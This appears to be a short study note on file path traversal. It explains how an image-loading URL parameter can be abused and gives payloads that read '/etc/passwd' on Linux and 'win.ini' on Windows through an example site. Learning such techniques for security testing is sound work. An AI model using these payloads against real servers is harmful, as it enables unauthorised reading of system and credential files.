# 2. File path traversal

Have a look at the .html page for things like `<img src="/loadImage?filename=218.png">` this will load the image 218.png. It might be possible to navigate the server file system be using search strings like.
### Linux
`../../../etc/passwd` i.e `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
### Windows
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini